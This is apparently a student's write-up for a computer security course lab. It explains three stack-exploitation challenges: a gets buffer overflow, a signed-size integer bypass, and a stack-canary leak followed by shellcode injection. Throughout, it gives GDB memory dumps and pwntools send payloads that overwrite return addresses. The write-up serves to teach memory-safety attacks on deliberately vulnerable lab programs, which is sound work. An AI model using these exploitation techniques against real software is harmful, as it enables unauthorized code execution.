# Write-Up


## Remus
### Main Idea
I utilized a `gets` vulnerability in order to continue writing into the stack past designated buffer. This allowed me to write into the location of memroy where the `rip` was stored. I then wrote the `SHELLCODE` into the address right after the `rip`, and then overwrote `rip` to point to the address of the `SHELLCODE`. This is because once the function returns, it will automatically move set the `eip` to `rip` and resume running the program. We can take advatange of this and make `eip` run our `SHELLCODE` instead of returning and continuing the program.


## Spica
### Main Idea
After looking at the `telemetry.c` code closely, I realized that I could utilize a integer type vulnerability that was taught in lecture. The spec mentions there is a piece of code that checks to make sure that the file read must have a byte size limit. The lines of code I spotted in `telemetry.c`:
```
if (bytes_read == 0 || size > 128) {
    return;
}
```
This check immediately made me think of the example given in lecture, where the attack was based upon the fact that the `size` variable was poorly initialized as an `int` instead of a `size_t`. Since the `int` type was signed, the attack would take advantage of two's complement representing a large unsigned number as a negative number, therefore bypassing the `size > 128` check. Lo and behold, in line 7: `int8_t size;`.
### Testing
I had to check one more thing. I went online to look at the C man pages for the `fread` function signature, and confirmed that its `arg2` was the type `size_t`. This would enable me to set `size` to be `0xff`, which is the largest possible number for the unsigned 8 bit integer, but actually just `-1` in the signed world of `int8_t`.
### Exploit Process
The first `fread` would happily write `0xff` into `size`, which would then pass the `if` check due to it comparing `int8_t` type against `128`. Then after that, the second `fread` function call will treat `size` like a `size_t` (unsigned int), and now I can write past where I am not supposed to. After gaining access to the area in memory outside of the file limit, all I needed to do was find where the return address was stored, which would inevitably be executed once the function returned.
### Magic Numbers
Using GDB, I found the address of the `rip` and subtracted it from the address of the beginning of `msg`. The address of `rip` was `148` bytes away from the start of `msg`, so I filled in garbage for `148` bytes till the location of `rip`, then overwrote `rip` to be another address just `4` bytes ahead, and then placed the `SHELLCODE` right there, and boom. Exploited.
### GDB
##### `info frame` output:
```
(gdb) i f
Stack level 0, frame at 0xffffd700:
 eip = 0x8049276 in display (telemetry.c:24); saved eip = 0xffffd700
 called by frame at 0x41414149
 source language c.
 Arglist at 0xffffd6f8, args: path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>
 Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
 Saved registers:
  ebp at 0xffffd6f8, eip at 0xffffd6fc
(gdb) 
```
`rip` is at `0xffffd6fc`.

#### Before exploit:
```
(gdb) b 18
Breakpoint 2 at 0x8049235: file telemetry.c, line 18.
(gdb) r
Starting program: /home/spica/telemetry navigation

Breakpoint 2, display (path=0xffffd8bb "navigation") at telemetry.c:18
18          bytes_read = fread(&size, 1, 1, file);
(gdb) x/44x msg  
0xffffd668:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd678:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd688:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd698:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6c8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6e8:     0x00000000      0x0804e000      0x00000000      0xffffdfe2
0xffffd6f8:     0xffffd718     >0x080492bd<     0xffffd8bb      0x00000000
0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffd730
(gdb) 
```
Breakpoint is placed before first fread.\
`rip` is labeled with surrounding `> <`.

#### After exploit:
```
(gdb) c
Continuing.

Breakpoint 1, display (path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>) at telemetr
y.c:24
24          puts(msg);
(gdb) x/44x msg
0xffffd668:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd678:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd688:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd698:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e8:     0x000000d2      0x41414141      0x41414141      0x41414141
0xffffd6f8:     0x41414141     >0xffffd700<     0xcd58326a      0x89c38980
0xffffd708:     0x58476ac1      0xc03180cd      0x692d6850      0xe2896969
```
`msg` is overwritten with A's (`41` in hexadecimal ASCII), and continues overwriting all the way to `rip` (labaled with `> <`)
The `rip` is overwritten with an address which is just `4` bytes in front, and at that address you can see the `SHELLCODE`, which looks very different than in the **Before** GDB dump.


## Polaris
### Main Idea
With one look at the problem spec I new that this time I could not simply perform any sort of write-past exploit, due the existence of the canary—which would immediately throw and error if it detected a change of itself. Since I felt this was going to be difficult (I ended up spending over 14 total hours on this problem unfortunately) I took a long look at `dehexify.c`. I had remembered from earlier lectures that the `gets` function was highly prone to write-past attacks, and I spotted the function within the `dehexify` function and I began thinking about my approach. I spent an hour trying to come up with any method to "hop" over the canary with no avail, so I decided to just try and overwite the canary for the heck of it.
### Testing
I performed the following tests within my interact:
```
p.send('A' * 15 + '\n)
```
This ended up overwriting the canary and—as expected—immediately threw a segmentation fault.
```
p.send('A' * 15 + '\\x')
```
I experimented some more.
```
p.send('A' * 16 + '0')
```
After trying these three lines I definitely new there was no way to attempt to overwrite the canary and still have a successful exploit. I knew I had to some how "jump" the canary bits. I recall from lecture that the method to "jump" the bits was to actually simply look at the canary (possibly with GDB) and then, during an overflow write attack, simply write the canary itself when you reach it and then continue with garbage `AAAAA`'s afterward. Going into GDB, I located the canary since they are always located between the local variables and the `sfp` and `rip` of the stack frame's function. I then ran into another problem: I didn't realize at first but it totally made sense: the canary would be randomized upon every run of the program. What good would the canary be if it was never randomized? A simple hex editor could easily crack the canary and a ton of exploits would be on their way. I had to find another section of code that could be exploited in order to print out the canary *during* that execution so that I could immediately pass the printed canary back into the program to exploit it.
### Second Idea
After browsing Ed forums and being stuck for a couple more hours, I found a post that hinted on the use of the `i` and `j` variables as part of the attack. I realized that a particular oversight from the programmer allowed me to abuse the hexadecimal cnoverter. The `while` loop in `dehexify` would take 4 characters of hexadecimal (`\x41` for example), and then convert it into one single ASCII letter (`A`). In the code I saw `i += 3` within the `if` statement of the converter, which made me realize that I could possibly cause `dehexify` to read past it's designated buffer size *without* overwriting the canary at all. Finally, I read through the spec again and noticed that in this case since the program expected the user to enter an actual hexadecimal as literal characters, all backslashes (`\`) had to be escaped with the escape character (which is also the backslash) in order for the program to recognize the backslash itself as part of the hexadecimal format. I got to work experimenting.
### Testing 2
I tried many different inputs to try and cause `i` to be way ahead of `j` in order to "skip" the read towards canary without actually writing anything over it. At this moment I still had not really understood how the skipping worked, but just that skipping was possible and existed as a possible exploit, hence the strange test inputs. Here are some of the `p.send`'s I tried:
```
p.send('\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\n')
p.send('\\x\\x\\x\\x\\x\\x\\x\n')
```
At this point I still did not fully grasp the format for hexadecimal, so I thought there was only one denoted character after the escaped double backslashes.
```
p.send('\\xAA\\xAA\\xAA\\xAA\\xAA\\xAA\\xAA\n'
p.send('\\xAA\\xAA\\xAA\\xAA\\\n\n')
```
After figuring out my error, I fixed my input and went backt to the trusty `AA` garbage byte. Here, I began to slowly get closer to solving part 1 of this exploit.
### Exploit Process
After this point and getting many many segmentation faults, I slowed down on brute forcing and thought for a moment how hopping `i` would actually work. I sat down and drew out a diagram of the bytes being tracked by `j` and then hopping 4 bytes with `i` to follow how both variables moved forward through a string as it was passed into the program. I realized that while `\\xAA` was `4` bytes (the `\\` counts as one character because the first backslash is escaping the second backslash, making it a literal backslash character), `i` was interpretting it as a single byte character. Although this might have been obvious, I did not fully understand how to precisely reach the canary. I realized, though, that since the buffer was `16` bytes long, `j` would actually be `3` after hopping all `16` bytes. This means that I would be able to make the program output more than it would input, by `i - j` amount. Since the canary was only `4` bytes, this was definitely possible. I got to work "hopping" `j` 4 times:
```
p.send('\\xAA\\xAA\\xAA\\xAA')
```
This still seg-faulted, and after being confused for a while I realized that `p.send` would simply always be unhappy if there was no newline `\n` character at the end of all inputs, so I tried:
```
p.send('\\xAA\\xAA\\xAA\\xAA\n')
```
But then quickly realized that this would seg-fault since although `j` was still relatively small due to hopping, `i` had blown past 15. I quickly realized I could fit a newline character right within the garbage, since each hexadecimal escape contained *two* hexadecimals:
```
p.send('\\xAA\\xAA\\xAA\\xA\n')
```
I finally found sucess after fitting the newline character within the hexadecimal escape character. This `p.send` finally did not seg-fault, so I was happy with that.\
\
Next, I began working on the receive code. With this `p.send` code, `i` is at `15` while `j` is at `3`. Since I know the canary is directly after the writable bytes, and the canary was `4` bytes, I wanted to receive all the way to the end of canary. Since `j` dictates the length of the end result post-conversion, my garbage's length would be `4` bytes long. The canary would be the immediate next `4` bytes after that. Soforth, I tried receiving `8` total bytes, `4` bytes of garbage `+` `4` bytes of canary:
```
print(p.recv(8))
```
This worked, although the Python `print` output was unintelligble since it was trying to convert raw bits into ASCII, I assume. The next thing was to extract the canary out of these received `8` bytes.
```
receive = p.recv(8)
canary = receive[4:8]
```
Now that I successfully extracted the canary, all that was left is to perform the second `p.send`, which would now write into `buffer` and then subsequently into the canary, which I have now obtained.
### Testing 3
I began writing the `p.send` and debugging with GDB to ensure that I was accessing the correct bytes of data. Here was the first iteration:
```
p.send('A' * 16 + canary)
```
In this iteration I just wanted to ensure that the canary was properly written into where it was supposed to be. I used GDB to check the canary during the curent runthrough and then compared it to what my exploit writes after stepping over the while loop. Indeed, it was successful, so theoretically this `p.send` should run fine. But it did not. I spent a couple minutes figuring out why, and I realized that I still had to follow the requirements for every `p.send`: strings had to end with the newline character. After adding my newline character, I continued writing more of my exploit.
```
p.send('A' * 15 + '\n' + canary + 'A' * 12 + '\xAA\xAA\xAA\xAA')
```
After trying this lien of code everything suddenly broke, so I got really confused. I spent a long time attempting to figure out why this `p.send` was not working. I finally solved the problem after visiting OH. Turns out, this `p.send` sees the newline character after adding `15` `A`'s and immediately terminates, ignoring the rest of my exploit, which isn't what we want. But I still need to be able to place a newline character right at the end of `buffer` or else the program would complain. I got help in OH and learned that we could trick the code by placing the null terminator within my `p.send`. This would not prematurely end `p.send` but would ensure the program would not complain overall since it would still "count" as the end of the string. After replacing the newline character with a null terminator, my `p.send` was now correctly filling up `buffer` with garbage, "hopping" over the canary, adding more garbage until it reaches the RIP, and then filling RIP with my garbage. Now that I could see that within GDB, I continued writing my exploit.
```
p.send('A' * 15 + '\x00' + canary + 'A' * 12 + '\x20\xd7\xff\xff' + SHELLCODE)
```
